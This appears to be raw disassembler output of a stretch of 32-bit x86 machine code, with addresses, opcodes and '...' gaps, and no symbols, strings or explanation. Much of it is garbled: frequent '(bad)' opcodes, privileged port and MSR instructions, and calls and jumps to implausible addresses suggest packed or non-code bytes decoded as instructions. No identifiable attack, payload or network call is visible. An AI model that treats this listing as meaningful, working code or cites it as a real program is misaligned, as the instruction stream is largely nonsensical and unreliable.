  430e34:	adc    al,BYTE PTR ds:0xd4c671
  430e3a:	lds    ebx,FWORD PTR [eax-0x7b896391]
  430e40:	mov    es,WORD PTR [eax]
	...
  430eb2:	add    BYTE PTR [eax],al
  430eb4:	add    al,0x67
  430eb6:	std    
  430eb7:	aaa    
  430eb8:	(bad)  
  430eb9:	mov    edi,0x8a6677ce
  430ebe:	retf   
  430ebf:	jne    0x430f38
  430ec1:	cld    
  430ec2:	daa    
  430ec3:	xor    dh,BYTE PTR [ebx-0xafffdfd]
  430ec9:	add    BYTE PTR [eax],al
  430ecb:	add    BYTE PTR [eax+0x1244fc17],bh
  430ed1:	or     BYTE PTR [ecx],al
  430ed3:	(bad)  
  430ed4:	pop    esi
  430ed5:	sahf   
  430ed6:	xchg   BYTE PTR [edx+0x76],bh
  430ed9:	and    dh,BYTE PTR [esi]
  430edb:	xor    ch,BYTE PTR [edi]
  430edd:	call   0x687c81ea
  430ee2:	cmp    eax,0xbb1b5c3e
  430ee7:	rol    BYTE PTR [edx+0x2b],cl
  430eea:	jae    0x430f4a
  430eec:	sub    DWORD PTR [esi],esp
  430eee:	sbb    esp,DWORD PTR [edi-0x2b75ac22]
  430ef4:	inc    ecx
  430ef5:	dec    ebx
  430ef6:	aaa    
  430ef7:	sbb    eax,0xa792f158
  430efc:	pop    ebx
  430efd:	mov    bh,0xa1
  430eff:	shr    BYTE PTR [ebx],cl
  430f01:	jge    0x430ed7
  430f03:	call   0xd0ae0bac
  430f08:	push   ss
  430f09:	add    al,0x21
  430f0b:	inc    edi
  430f0c:	lahf   
  430f0d:	leave  
  430f0e:	in     al,dx
  430f0f:	jno    0x430ec7
  430f11:	loopne 0x430ee6
  430f13:	test   ch,bl
  430f15:	(bad)  
  430f16:	out    0xe3,al
  430f18:	pop    edx
  430f19:	push   0xa837bd7e
  430f1e:	jecxz  0x430f72
  430f20:	jmp    esi
  430f22:	inc    eax
  430f23:	cdq    
  430f24:	xchg   esp,eax
  430f25:	xchg   esi,eax
  430f26:	gs (bad) 
  430f28:	push   ebx
  430f29:	cmp    cl,BYTE PTR [eax-0x5e]
  430f2c:	push   ds
  430f2d:	mov    ah,0x26
  430f2f:	cmc    
  430f30:	popa   
  430f31:	mov    cs,WORD PTR ss:[edx-0x718b56ee]
  430f38:	and    BYTE PTR [eax],ah
  430f3a:	repz (bad) 
  430f3c:	out    dx,eax
  430f3d:	mov    ebx,0x84960ee3
  430f42:	mov    cl,0x23
  430f44:	ror    DWORD PTR [esp+esi*4+0x5b],1
  430f48:	inc    edx
  430f49:	arpl   WORD PTR [edx+eiz*1],di
  430f4c:	cmp    al,0x1e
  430f4e:	jmp    FWORD PTR [eax-0x464a5451]
  430f54:	lock loope 0x430f56
  430f57:	xor    eax,0xdd05e0c5
  430f5c:	add    DWORD PTR ds:0x8fd481d3,ebp
  430f62:	push   ebx
  430f63:	div    BYTE PTR [esi]
  430f65:	ret    
  430f66:	xchg   edx,eax
  430f67:	xchg   edi,eax
  430f68:	(bad)  
  430f69:	(bad)  
  430f6a:	hlt    
  430f6b:	(bad)  
  430f6c:	rcl    edi,cl
  430f6e:	xchg   esi,eax
  430f6f:	loop   0x430fe8
  430f71:	bound  ebp,QWORD PTR [ebp+0x51]
  430f74:	sbb    bl,BYTE PTR [ebx-0x9e8a6ef]
  430f7a:	mov    bh,0xc7
  430f7c:	inc    eax
  430f7d:	dec    ebp
  430f7e:	(bad)  
  430f7f:	jo     0x430fbd
  430f81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430f82:	stc    
  430f83:	pop    ss
  430f84:	sub    ch,0xe4
  430f87:	push   es
  430f88:	das    
  430f89:	(bad)  
  430f8b:	imul   ebx,edi,0x76bad87f
  430f91:	scas   eax,DWORD PTR es:[edi]
  430f92:	es out 0xe8,al
  430f95:	in     eax,0xcb
  430f97:	mov    edx,0x1572cce3
  430f9c:	bound  edx,QWORD PTR [ecx-0x15be07af]
  430fa2:	mov    edx,0xa6d3acad
  430fa7:	pop    ecx
  430fa8:	enter  0x7b1f,0xf2
  430fac:	cmp    DWORD PTR [ebp+0x534867b4],edx
  430fb2:	push   ebx
  430fb3:	dec    ebp
  430fb4:	inc    ebx
  430fb5:	mov    eax,ds:0x63098547
  430fba:	jb     0x431012
  430fbc:	aad    0xc0
  430fbe:	mov    dh,0x8e
  430fc0:	fild   DWORD PTR [eax]
	...
  431032:	add    BYTE PTR [eax],al
  431034:	(bad)  
  431035:	ins    DWORD PTR es:[edi],dx
  431036:	aam    0xb5
  431038:	(bad)  
  431039:	mov    ebp,0xead87fe7
  43103e:	fs dec esp
  431040:	les    ecx,FWORD PTR [ebx]
  431042:	pop    ebp
  431043:	sbb    ebp,DWORD PTR [eax-0x76fffdfc]
  431049:	add    BYTE PTR [eax],al
  43104b:	add    BYTE PTR [esi+ebp*4],bl
  43104e:	xor    eax,ebp
  431050:	retf   
  431051:	inc    ebx
  431052:	fidiv  WORD PTR [ecx]
  431054:	push   0x1b6fb685
  431059:	push   ecx
  43105a:	imul   eax,esp,0xffffff9f
  43105d:	pusha  
  43105e:	int    0x2f
  431060:	adc    dl,BYTE PTR [eax+ebp*8+0x4baf8f0f]
  431067:	imul   esi,edx,0x46c9b49f
  43106d:	inc    edx
  43106e:	mov    eax,0x7ce06ef8
  431073:	cmp    eax,0x93578eb5
  431078:	(bad)  
  43107a:	jecxz  0x43109e
  43107c:	scas   al,BYTE PTR es:[edi]
  43107d:	mov    WORD PTR [ebp-0x9cfcbfd],?
  431083:	in     eax,0x35
  431085:	xchg   edx,eax
  431086:	rcl    DWORD PTR [esi+0x0],1
  431089:	push   ebx
  43108a:	sti    
  43108b:	popf   
  43108c:	scas   al,BYTE PTR es:[edi]
  43108d:	mov    edx,0x7261d19a
  431092:	sbb    DWORD PTR [edx+0x7b],edx
  431095:	fnstenv [esi+0x258335af]
  43109b:	imul   edx,DWORD PTR [edx],0xda2a77ef
  4310a1:	cmc    
  4310a2:	and    al,0xf2
  4310a4:	xor    eax,0x698fdd51
  4310a9:	pop    ebx
  4310aa:	pop    esi
  4310ab:	inc    ebx
  4310ac:	aaa    
  4310ad:	scas   eax,DWORD PTR es:[edi]
  4310ae:	ins    DWORD PTR es:[edi],dx
  4310af:	int    0x9b
  4310b1:	or     BYTE PTR [edi],bh
  4310b3:	popa   
  4310b4:	pop    esi
  4310b5:	cwde   
  4310b6:	aam    0x6c
  4310b8:	nop
  4310b9:	dec    ecx
  4310bb:	leave  
  4310bc:	stos   BYTE PTR es:[edi],al
  4310bd:	mov    ah,0xbe
  4310bf:	(bad)  [edx+0x6c]
  4310c2:	push   edx
  4310c3:	mov    dl,0x2e
  4310c5:	cli    
  4310c6:	arpl   di,bp
  4310c8:	out    0xc1,eax
  4310ca:	push   ds
  4310cb:	dec    esi
  4310cc:	push   cs
  4310cd:	out    0x48,eax
  4310cf:	push   es
  4310d0:	mov    ecx,0x55b37bef
	...
  431131:	add    BYTE PTR [eax],al
  431133:	add    BYTE PTR [ebp+0x55],cl
  431136:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  43113c:	mov    esp,ebp
  43113e:	or     al,ah
  431140:	dec    ebp
  431141:	add    bh,al
  431143:	add    BYTE PTR [eax],cl
  431145:	add    BYTE PTR [eax],al
  431147:	mov    DWORD PTR [eax],0x3ef44545
  43114d:	add    BYTE PTR ss:[ebp-0x70b6375],al
  431154:	retf   
  431155:	(bad)  
  431156:	enter  0x4d45,0xb8
  43115a:	mov    edi,DWORD PTR [ecx]
  43115c:	hlt    
  43115d:	test   ebx,ecx
  43115f:	pushf  
  431160:	enter  0x4df8,0x8b
  431164:	mov    DWORD PTR [ebp+0x8],0x894708
  43116b:	inc    ebp
  43116c:	mov    ebp,0xff8bfffc
  431171:	dec    ebp
  431172:	mov    ch,0xf4
  431174:	call   DWORD PTR [ebx-0x1]
  431177:	mov    ebx,0x8005122
  43117c:	call   DWORD PTR [ecx+0x8]
  43117f:	pop    es
  431180:	jmp    0xb8:0x9cb4533
  431187:	cdq    
  431188:	mov    esi,DWORD PTR [edx-0xc]
  43118b:	xor    al,bl
  43118d:	add    BYTE PTR [ecx+0x3c83203],bl
  431193:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  431199:	mov    eax,DWORD PTR [ebx-0xb87b3]
  43119f:	xor    eax,DWORD PTR [eax]
  4311a1:	retf   
  4311a2:	ret    
  4311a3:	add    eax,esi
  4311a5:	enter  0x8945,0x64
  4311a9:	dec    ebp
  4311aa:	sbb    ah,cl
  4311ac:	add    BYTE PTR [ebx-0xb87b277],cl
  4311b2:	dec    DWORD PTR [ebx-0xbcfb275]
  4311b8:	test   DWORD PTR [ebx],esi
  4311ba:	dec    ebx
  4311bc:	inc    DWORD PTR [ebx]
  4311be:	inc    eax
  4311bf:	enter  0x8989,0x64
  4311c3:	(bad)  
  4311c4:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  4311c8:	cld    
  4311c9:	dec    DWORD PTR [ebp-0xa90001]
  4311cf:	push   edi
  4311d0:	mov    BYTE PTR [edx+0x1],ch
  4311d3:	and    BYTE PTR [eax],al
  4311d5:	pop    ecx
  4311d6:	inc    ebp
  4311d7:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  4311dd:	push   0xffffff89
  4311df:	pop    ecx
  4311e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4311e1:	dec    ebp
  4311e2:	add    BYTE PTR [ecx+0x45fc088b],cl
  4311e8:	jne    0x431232
  4311ea:	lea    eax,[eax]
  4311ec:	fs (bad) 
  4311ee:	dec    DWORD PTR [eax]
  4311f0:	mov    DWORD PTR [eax],eax
  4311f2:	test   al,0x0
  4311f4:	add    BYTE PTR [ebp-0x18],cl
  4311f7:	xor    ebp,DWORD PTR [edx]
  4311f9:	add    eax,DWORD PTR [eax]
  4311fb:	mov    eax,eax
  4311fd:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  431204:	inc    ebp
  431205:	mov    DWORD PTR [ebx+0x459408],ecx
  43120b:	popa   
  43120c:	mov    esp,DWORD PTR [ebp-0x75]
  43120f:	(bad)  
  431210:	cld    
  431211:	inc    eax
  431212:	cmp    bh,0x1
  431215:	lea    eax,[eax]
  431217:	and    BYTE PTR [eax],al
  431219:	inc    DWORD PTR [ecx-0x18]
  43121c:	mov    ecx,DWORD PTR [ebx]
  43121e:	cld    
  43121f:	add    BYTE PTR [ecx+0x75014d],cl
  431225:	(bad)  
  431226:	xchg   ebp,eax
  431227:	sar    bh,1
  431229:	inc    eax
  43122a:	inc    DWORD PTR [eax]
  43122c:	mov    eax,DWORD PTR [ebp-0x4]
  43122f:	xor    edx,DWORD PTR [edx+0x7201be]
  431235:	add    BYTE PTR [edx],dl
  431237:	(bad)  
  431238:	nop
  431239:	inc    ebp
  43123a:	add    BYTE PTR [ebx-0x5afb0c00],cl
  431240:	mov    al,0xff
  431242:	add    bh,bh
  431244:	add    BYTE PTR [ebx],dh
  431246:	inc    DWORD PTR [ebx]
  431248:	sbb    al,0x89
  43124a:	jne    0x431228
  43124c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  431252:	mov    eax,DWORD PTR [ebp-0xff0048]
  431258:	mov    DWORD PTR [eax-0x70],0xe870e989
  43125f:	inc    DWORD PTR [ebp-0x75]
  431262:	(bad)  [esi+ebp*8]
  431265:	test   DWORD PTR [esi-0x1],esp
  431268:	inc    ebp
  431269:	(bad)  
  43126a:	aas    
  43126b:	inc    ebp
  43126c:	(bad)  
  43126d:	lea    edi,[eax+edi*2-0x1]
  431271:	inc    edi
  431273:	mov    DWORD PTR [ecx],edi
  431275:	mov    al,ds:0x8b8000c7
  43127a:	call   0x45d0f57b
  43127f:	(bad)  
  431280:	out    dx,al
  431281:	(bad)  
  431282:	fisttp WORD PTR [eax+0x8801c7]
  431288:	jecxz  0x4312cf
  43128a:	call   0xe83f588e
  43128f:	lea    edi,[edi]
  431291:	(bad)  
  431292:	call   0xcb3d96
  431297:	add    DWORD PTR [ebx-0x7f570400],ecx
  43129d:	add    BYTE PTR [ecx],al
  43129f:	test   DWORD PTR [eax],eax
  4312a1:	wrmsr  
  4312a3:	jae    0x431292
  4312a5:	add    BYTE PTR [eax],al
  4312a7:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  4312ad:	add    esp,edi
  4312af:	add    BYTE PTR [eax+0x450108],al
  4312b5:	mov    edi,DWORD PTR [ebp-0x6c]
  4312b8:	add    DWORD PTR [eax],0x4
  4312bb:	mov    eax,DWORD PTR [ebp+0x3]
  4312be:	mov    edi,DWORD PTR [esp+edi*8]
  4312c1:	dec    ebp
  4312c2:	nop
  4312c3:	mov    eax,DWORD PTR [ecx]
  4312c5:	fadd   DWORD PTR [eax]
  4312c7:	add    BYTE PTR [esi],al
  4312c9:	lea    eax,[eax]
  4312cb:	pusha  
  4312cc:	push   eax
  4312cd:	inc    DWORD PTR [ebp+0x52]
  4312d0:	call   DWORD PTR [ebp-0x7b]
  4312d3:	mov    esi,DWORD PTR [ebp-0x74]
  4312d6:	mov    eax,DWORD PTR [eax]
  4312d8:	cld    
  4312d9:	mov    eax,DWORD PTR [eax+0x880103]
  4312df:	add    BYTE PTR [ebp+0x6a],bh
  4312e2:	cmp    edi,0x10
  4312e5:	mov    WORD PTR [ebp+0x0],es
  4312e8:	mov    edx,DWORD PTR [edx-0x4]
  4312eb:	push   ecx
  4312ec:	nop
  4312ed:	inc    DWORD PTR [ecx]
  4312ef:	cld    
  4312f0:	add    BYTE PTR [ebp-0x24],bh
  4312f3:	mov    eax,DWORD PTR [eax]
  4312f5:	cld    
  4312f6:	push   eax
  4312f7:	nop
  4312f8:	inc    ebp
  4312f9:	add    edi,edi
  4312fb:	add    BYTE PTR [ebx+0x4de2f445],cl
  431301:	jmp    0xe33b:0x9403c733
  431308:	movntq QWORD PTR [esi],mm6
  43130b:	mov    DWORD PTR [eax],0xb87e8b98
  431311:	test   ebx,eax
  431313:	jmp    DWORD PTR [edi-0x1]
  431316:	int    0xe9
  431318:	sub    esp,esi
  43131a:	add    eax,DWORD PTR [ebp-0x30]
  43131d:	fild   WORD PTR [ebp+0x3f]
  431320:	cmp    eax,edi
  431322:	je     0xcc43f944
  431328:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  43132f:	(bad)  
  431330:	jne    0x4312be
  431332:	mov    ebx,ecx
  431334:	cld    
  431335:	jle    0x43137c
  431337:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  43133d:	inc    ebp
  43133e:	call   0xeb3cce
  431343:	add    BYTE PTR [ebx-0x7f170301],cl
  431349:	add    DWORD PTR es:[eax],eax
  43134c:	add    al,al
  43134e:	xor    BYTE PTR [eax+0x41],dl
  431351:	inc    ebp
  431352:	add    BYTE PTR [ebx+0xfcd88b],cl
  431358:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  43135e:	add    DWORD PTR [ecx+0x458be845],ecx
  431364:	fmul   DWORD PTR [ebx+0x8bb800]
  43136a:	cld    
  43136b:	call   0xd83e30
  431370:	dec    DWORD PTR [ebx+0x1090e8ff]
  431376:	add    al,al
  431378:	push   eax
  431379:	es inc ebp
  43137b:	inc    ebp
  43137c:	mov    ecx,DWORD PTR [ebx+0xd89c]
  431382:	dec    DWORD PTR [ebx-0x3ff70301]
  431388:	mov    DWORD PTR gs:[eax],eax
  43138b:	call   0x8b6b5950
  431390:	inc    ebp
  431391:	mov    eax,0xe8d8008b
  431396:	add    BYTE PTR [ecx],ch
  431398:	mov    eax,DWORD PTR [eax]
  43139a:	cld    
  43139b:	mov    eax,eax
  43139d:	call   0x462b23f7
  4313a2:	sub    DWORD PTR [ebx-0x3c743000],ecx
  4313a8:	cld    
  4313a9:	mov    BYTE PTR [eax+0x8401c1],0x1
  4313b0:	xor    BYTE PTR [eax],al
  4313b2:	push   edi
  4313b3:	inc    ebp
  4313b4:	mov    DWORD PTR [ebx],esi
  4313b6:	in     al,0xb9
  4313b8:	inc    ebp
  4313b9:	lea    ecx,[ebx-0x3c370301]
  4313bf:	dec    ebp
  4313c0:	cdq    
  4313c1:	mov    esi,DWORD PTR [edx]
  4313c3:	or     BYTE PTR [ebx],al
  4313c5:	ror    DWORD PTR [ebp-0xfebf79],0x0
  4313cc:	call   0x433d16
  4313d1:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  4313d7:	jge    0x43140c
  4313d9:	mov    eax,DWORD PTR [ebx]
  4313db:	cld    
  4313dc:	lea    edx,[eax+0xff0120]
  4313e2:	call   0x433d76
  4313e7:	push   eax
  4313e8:	inc    DWORD PTR [ebp-0x1c]
  4313eb:	mov    ecx,DWORD PTR [ebp-0x58]
  4313ee:	xor    eax,DWORD PTR [eax]
  4313f0:	add    edi,edi
  4313f2:	cmp    ebp,eax
  4313f4:	jne    0x43141c
  4313f6:	mov    DWORD PTR [eax],0x8b004dd8
  4313fc:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  431403:	mov    eax,ebx
  431405:	cld    
  431406:	test   BYTE PTR [eax+0x320199],bh
  43140c:	mov    DWORD PTR [ebp+0x8],esi
  43140f:	xor    eax,DWORD PTR [ebp-0x73]
  431412:	test   DWORD PTR [esp+esi*2-0x1],edi
  431416:	mov    ebp,eax
  431418:	mov    eax,0x33004d29
  43141d:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  431423:	add    DWORD PTR [eax],eax
  431425:	add    BYTE PTR [ebp+0x30],al
  431428:	mov    edx,DWORD PTR [edi-0x48]
  43142b:	add    ebx,0xffffffe4
  43142e:	addr16 test ebp,ecx
  431431:	je     0x43145e
  431433:	mov    eax,DWORD PTR [ebx]
  431435:	cld    
  431436:	sar    BYTE PTR [eax+0x3b0145],1
  43143c:	pcmpeqw mm4,mm6
  43143f:	xor    edi,edi
  431441:	lea    ecx,[ebx-0x239c7470]
  431447:	add    BYTE PTR [ebp+0x50],cl
  43144a:	cmp    eax,DWORD PTR [ebp+0x75]
  43144d:	mov    ebp,DWORD PTR [eax-0x68]
  431450:	test   DWORD PTR [eax],eax
  431452:	clc    
  431453:	push   DWORD PTR [ebp-0x1]
  431456:	lea    ecx,[eax]
  431458:	int3   
  431459:	inc    ebp
  43145a:	call   0xfb44ea
  43145f:	jne    0x431459
  431461:	xor    edi,DWORD PTR [ebp-0x41]
  431464:	jmp    0x4314d8
  431466:	mov    eax,DWORD PTR [eax]
  431468:	mov    eax,0x339545c7
  43146d:	inc    DWORD PTR [ebx]
  43146f:	push   DWORD PTR [ecx]
  431471:	aaa    
  431472:	mov    eax,DWORD PTR [eax]
  431474:	jmp    0x4314c6
  431476:	mov    eax,DWORD PTR [ebp-0x3c]
  431479:	mov    eax,eax
  43147b:	cld    
  43147c:	clc    
  43147d:	ret    
  43147e:	test   bh,al
  431480:	pop    es
  431481:	xchg   ebp,eax
  431482:	add    bh,bh
  431484:	inc    ebp
  431485:	dec    DWORD PTR [edi]
  431487:	and    DWORD PTR [ebx],ebp
  431489:	add    BYTE PTR [eax],al
  43148b:	push   eax
  43148c:	jbe    0x4314e3
  43148e:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  431494:	or     al,0xcf
  431496:	inc    eax
  431497:	enter  0x745,0x72
  43149b:	inc    ebp
  43149c:	mov    eax,DWORD PTR [ecx]
  43149e:	int3   
  43149f:	add    BYTE PTR [ebp-0x75],al
  4314a2:	ss mov eax,0x33c74d9c
  4314a8:	ror    BYTE PTR [ebp+0x72f80885],1
  4314ae:	inc    ebp
  4314af:	add    BYTE PTR [ebx-0x3c7423bb],cl
  4314b5:	fadd   st,st(6)
  4314b7:	rol    BYTE PTR [ebp+0x12],0x8b
  4314bb:	inc    ebp
  4314bc:	fmul   QWORD PTR [ebx-0x3c39233d]
  4314c2:	inc    ebp
  4314c3:	test   bh,al
  4314c5:	cdq    
  4314c6:	clc    
  4314c7:	xor    al,BYTE PTR [ebp+0x45dcf889]
  4314cd:	inc    ebp
  4314ce:	cmp    BYTE PTR [ebx],dh
  4314d0:	pushf  
  4314d1:	mov    ecx,0xffb48dc7
  4314d6:	test   eax,ecx
  4314d8:	clc    
  4314d9:	dec    ebp
  4314da:	inc    ebp
  4314db:	mov    edi,DWORD PTR [edx]
  4314dd:	or     BYTE PTR [ecx+eax*8-0x15b7939],bl
  4314e4:	test   edi,edi
  4314e6:	clc    
  4314e7:	test   DWORD PTR [ebp+0x45],0x89c8b3c
  4314ee:	(bad)  
  4314ef:	enter  0x18e8,0x85
  4314f3:	ss clc 
  4314f5:	pushf  
  4314f6:	inc    ebp
  4314f7:	dec    DWORD PTR [ebx-0x3cba0f04]
  4314fd:	push   eax
  4314fe:	xabort 0x7d
  431501:	add    BYTE PTR [ebx],bh
  431503:	mov    ecx,DWORD PTR [edi]
  431505:	mov    DWORD PTR [eax],ebx
  431507:	les    eax,FWORD PTR [eax]
  431509:	adc    ebp,ecx
  43150b:	dec    ebp
  43150c:	add    DWORD PTR [ebx-0x34ba3c00],ecx
  431512:	mov    ecx,esi
  431514:	lock or al,cl
  431517:	clc    
  431518:	inc    ebp
  431519:	add    esi,DWORD PTR [ebx]
  43151b:	jge    0x431520
  43151d:	xor    edi,DWORD PTR [ebx]
  43151f:	cmp    ecx,DWORD PTR [edi]
  431521:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  431526:	mov    edi,DWORD PTR [ecx]
  431528:	test   al,0xcc
  43152a:	dec    ebp
  43152b:	test   BYTE PTR [ebx],dh
  43152d:	pop    es
  43152e:	xor    eax,DWORD PTR [eax]
  431530:	add    ecx,DWORD PTR [esi]
  431532:	add    ecx,eax
  431534:	psraw  mm0,mm1
  431537:	sub    BYTE PTR [ebp+0x38],cl
  43153a:	mov    edi,DWORD PTR [ebx]
  43153c:	lock int3 
  43153e:	shl    edx,1
  431540:	rol    BYTE PTR [ebp+0xc],1
  431543:	mov    DWORD PTR [ebp-0x24],0xf8038533
  43154a:	jmp    0x7c1594
  43154f:	pushf  
  431550:	inc    ebp
  431551:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  431557:	xor    ecx,ebx
  431559:	add    ecx,esi
  43155b:	mov    esi,eax
  43155d:	enter  0x45af,0x8b
  431561:	xor    ecx,eax
  431563:	add    edx,DWORD PTR [ebp-0x77]
  431566:	sub    ecx,DWORD PTR [eax]
  431568:	cmp    eax,DWORD PTR [ebp+0x77]
  43156b:	(bad)  
  43156c:	mov    ebx,DWORD PTR [eax+ebp*4+0xa889c7]
  431573:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  431579:	cmp    esi,DWORD PTR [ebx]
  43157b:	pushf  
  43157c:	xor    eax,edi
  43157e:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  431585:	inc    ebp
  431586:	dec    ebp
  431587:	cmp    eax,0xc7f09c8b
  43158c:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  431593:	inc    ebp
  431594:	jmp    0x4315d5
  431596:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  43159d:	dec    ebp
  43159e:	xor    esi,DWORD PTR [ebx]
  4315a0:	add    eax,DWORD PTR [ebx]
  4315a2:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  4315a8:	dec    ebp
  4315a9:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  4315af:	out    dx,eax
  4315b0:	rol    BYTE PTR [eax],1
  4315b2:	add    eax,0xebc8458b
  4315b7:	dec    ebp
  4315b8:	mov    ebp,DWORD PTR [ebx]
  4315ba:	mov    esp,0x33f84d8b
  4315bf:	ret    
  4315c0:	xor    eax,esi
  4315c2:	add    ecx,eax
  4315c4:	add    eax,DWORD PTR [edx+0xc1010f]
  4315ca:	dec    ebp
  4315cb:	inc    ebp
  4315cc:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  4315d2:	ror    bl,1
  4315d4:	add    eax,0xebc645ce
  4315d9:	scas   eax,DWORD PTR es:[edi]
  4315da:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  4315e0:	xor    ebp,DWORD PTR [ebx]
  4315e2:	xor    edi,DWORD PTR [ebx]
  4315e4:	add    esi,DWORD PTR [edi+0x3]
  4315e7:	mov    ecx,DWORD PTR [edi]
  4315e9:	clc    
  4315ea:	rol    ebx,0x4d
  4315ed:	(bad)  
  4315ee:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  4315f5:	mov    ah,0x45
  4315f7:	dec    ebp
  4315f8:	jbe    0x43162d
  4315fa:	mov    esi,DWORD PTR [ebx]
  4315fc:	call   0x33466304
  431601:	rdpmc  
  431603:	rol    DWORD PTR [ebx],0x4d
  431606:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  43160c:	inc    ebp
  43160d:	ror    BYTE PTR [ebx+0x45450808],1
  431613:	jmp    0x10b16a3
  431618:	inc    ebp
  431619:	inc    ebp
  43161a:	(bad)  
  43161b:	mov    ebx,eax
  43161d:	clc    
  43161e:	test   ebx,eax
  431620:	clc    
  431621:	retf   
  431622:	inc    ebp
  431623:	into   
  431624:	mov    esi,0x8b85afec
  43162a:	clc    
  43162b:	enter  0x5545,0x38
  43162f:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  431636:	ret    
  431637:	mov    ah,0xc6
  431639:	addr16 push 0x338b4545
  43163f:	clc    
  431640:	add    eax,ebx
  431642:	loopne 0x43160f
  431644:	dec    ebp
  431645:	into   
  431646:	mov    al,dh
  431648:	or     BYTE PTR [edi-0x37ff748e],ch
  43164e:	inc    ebp
  43164f:	push   ebp
  431650:	mov    ebp,DWORD PTR [ebx]
  431652:	in     al,dx
  431653:	cmp    eax,ebx
  431655:	ja     0x43169c
  431657:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  43165d:	inc    ebp
  43165e:	cdq    
  43165f:	mov    esi,DWORD PTR [edx]
  431661:	clc    
  431662:	mov    bl,al
  431664:	xlat   BYTE PTR ds:[ebx]
  431665:	retf   
  431666:	inc    ebp
  431667:	into   
  431668:	mov    eax,esi
  43166a:	in     al,dx
  43166b:	scas   eax,DWORD PTR es:[edi]
  43166c:	retf   
  43166d:	mov    ecx,DWORD PTR [ebp-0x38]
  431670:	mov    edx,DWORD PTR [ebp-0x24]
  431673:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8867]
  43167a:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  431681:	mov    eax,DWORD PTR [ebx]
  431683:	clc    
  431684:	loopne 0x431649
  431686:	push   ebp
  431687:	retf   
  431688:	mov    dh,al
  43168a:	adc    esi,ecx
  43168c:	jb     0x43163d
  43168e:	add    BYTE PTR [ebx+0x558bc845],cl
  431694:	in     al,dx
  431695:	sub    eax,ebx
  431697:	cmp    ecx,ebx
  431699:	mov    eax,esi
  43169b:	mov    esp,0x45af03ce
  4316a0:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  4316a6:	mov    eax,ebx
  4316a8:	in     al,dx
  4316a9:	into   
  4316aa:	dec    ebp
  4316ab:	(bad)  
  4316ac:	xor    ebp,DWORD PTR [edi+0x80f8903]
  4316b2:	rol    DWORD PTR [ebp+0x4d],0x89
  4316b6:	xor    esp,esp
  4316b8:	sub    eax,DWORD PTR [ebp-0x75]
  4316bb:	add    ebp,esp
  4316bd:	mov    al,0x55
  4316bf:	inc    ebp
  4316c0:	xor    esi,DWORD PTR [esi]
  4316c2:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  4316c9:	inc    ebp
  4316ca:	xor    edi,DWORD PTR [ecx]
  4316cc:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  4316d3:	test   DWORD PTR [eax],eax
  4316d5:	clc    
  4316d6:	enter  0x8645,0x33
  4316da:	inc    DWORD PTR [ebx]
  4316dc:	(bad)  
  4316dd:	jmp    0x431724
  4316df:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  4316e5:	inc    ebp
  4316e6:	(bad)  
  4316e7:	mov    ebp,DWORD PTR [edi-0x277b7424]
  4316ed:	cdq    
  4316ee:	retf   
  4316ef:	xor    al,cl
  4316f1:	mov    BYTE PTR [ebp+0xb],cl
  4316f4:	lea    eax,[ebp+0x8]
  4316f7:	xor    esi,DWORD PTR [edx+0x3]
  4316fa:	add    al,ah
  4316fc:	inc    ebp
  4316fd:	dec    ebp
  4316fe:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  431704:	addr16 add ch,cl
  431707:	inc    ebp
  431708:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  43170e:	inc    ebp
  43170f:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  431715:	push   ebp
  431716:	(bad)  
  431717:	mov    BYTE PTR [edi+0xf723b11],ch
  43171d:	add    ch,ch
  43171f:	inc    ebp
  431720:	dec    DWORD PTR [ebx-0x34332775]
  431726:	add    al,0x4d
  431728:	inc    ebp
  431729:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  43172f:	cdq    
  431730:	add    DWORD PTR [edx],esi
  431732:	add    BYTE PTR [ebx+0x4d00c000],cl
  431738:	push   DWORD PTR [ebx]
  43173a:	int3   
  43173b:	xor    eax,DWORD PTR [eax]
  43173d:	add    edx,DWORD PTR [eax+0x3]
  431740:	mov    DWORD PTR [edi],ecx
  431742:	call   0x4288d808
  431747:	mov    DWORD PTR [ebp-0x20],esp
  43174a:	add    BYTE PTR [ebp+0x7d],al
  43174d:	mov    eax,DWORD PTR [eax]
  43174f:	in     al,0x15
  431751:	ret    
  431752:	iret   
  431753:	(bad)  
  431754:	enter  0x14af,0x8b
  431758:	(bad)  
  431759:	in     al,dx
  43175a:	or     bl,cl
  43175c:	adc    cl,al
  43175e:	push   ebp
  43175f:	dec    ebp
  431760:	inc    eax
